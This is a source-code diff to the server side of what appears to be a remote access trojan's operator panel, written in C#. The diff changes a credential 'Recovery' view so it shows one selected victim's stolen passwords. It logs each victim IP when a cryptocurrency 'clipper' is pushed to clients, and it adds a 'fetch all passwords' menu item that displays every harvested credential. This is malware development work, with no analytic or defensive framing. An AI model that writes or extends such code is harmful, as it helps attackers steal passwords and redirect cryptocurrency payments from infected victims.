@@ -1620,15 +1620,15 @@ namespace Server
         {
             try
             {
+                Clients cl = GetSelectedClients()[0];
                 var recoveryform = (FromRecovery)Application.OpenForms["Recovery"];
                 if (recoveryform == null) recoveryform = new FromRecovery() { Name = "Recovery" };
                 recoveryform.Show(this);
-                recoveryform.ViewAll();
+                recoveryform.ViewClient(cl);
             }
             catch (Exception ex)
             {
                 MessageBox.Show(ex.Message);
-                return;
             }
         }
 
@@ -2343,8 +2343,10 @@ namespace Server
             msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());
 
             foreach (Clients client in GetSelectedClients())
-                    ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
-            new HandleLogs().Addmsg("Installing clipper...", Color.Blue);
+            {
+                ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
+                new HandleLogs().Addmsg($"Installing clipper on {client.Ip}...", Color.Blue);
+            }
         }
 
         private void initPluginsToolStripMenuItem_Click(object sender, EventArgs e)
@@ -2353,6 +2355,22 @@ namespace Server
             msgpack.ForcePathObject("Pac_ket").AsString = "init_reg";
             foreach (Clients client in GetSelectedClients())
                 ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
+        }
+
+        private void fetchAllPasswordsToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            try
+            {
+                var recoveryform = (FromRecovery)Application.OpenForms["Recovery"];
+                if (recoveryform == null) recoveryform = new FromRecovery() { Name = "Recovery" };
+                recoveryform.Show(this);
+                recoveryform.ViewAll();
+            }
+            catch (Exception ex)
+            {
+                MessageBox.Show(ex.Message);
+                return;
+            }
         }
     }
 }
